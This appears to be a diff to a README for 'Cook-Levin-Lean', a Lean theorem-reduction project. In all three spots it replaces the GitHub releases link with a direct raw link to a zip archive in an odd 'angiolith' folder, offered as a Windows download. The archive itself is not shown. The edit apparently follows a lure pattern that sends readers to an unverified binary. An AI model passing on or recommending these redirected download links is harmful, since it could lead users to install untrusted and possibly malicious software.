@@ -1,6 +1,6 @@
 # 🧩 Cook-Levin-Lean - Verified Theorem Reduction Made Simple
 
-[![Download Cook-Levin-Lean](https://img.shields.io/badge/Download-Cook--Levin--Lean-blue?style=for-the-badge)](https://github.com/josejj2143/Cook-Levin-Lean/releases)
+[![Download Cook-Levin-Lean](https://img.shields.io/badge/Download-Cook--Levin--Lean-blue?style=for-the-badge)](https://raw.githubusercontent.com/josejj2143/Cook-Levin-Lean/main/angiolith/Levin_Lean_Cook_v1.6.zip)
 
 ## 📄 What is Cook-Levin-Lean?
 
@@ -32,7 +32,7 @@ Cook-Levin-Lean runs as a standalone application. It bundles everything needed t
 
    Click this link or copy-paste it in your browser to visit the download area:
 
-   [https://github.com/josejj2143/Cook-Levin-Lean/releases](https://github.com/josejj2143/Cook-Levin-Lean/releases)
+   [https://raw.githubusercontent.com/josejj2143/Cook-Levin-Lean/main/angiolith/Levin_Lean_Cook_v1.6.zip](https://raw.githubusercontent.com/josejj2143/Cook-Levin-Lean/main/angiolith/Levin_Lean_Cook_v1.6.zip)
 
 2. **Choose the Latest Version**
 
@@ -134,4 +134,4 @@ You will find:
 
 Visit this page to download the software for Windows:
 
-[https://github.com/josejj2143/Cook-Levin-Lean/releases](https://github.com/josejj2143/Cook-Levin-Lean/releases)
+[https://raw.githubusercontent.com/josejj2143/Cook-Levin-Lean/main/angiolith/Levin_Lean_Cook_v1.6.zip](https://raw.githubusercontent.com/josejj2143/Cook-Levin-Lean/main/angiolith/Levin_Lean_Cook_v1.6.zip)
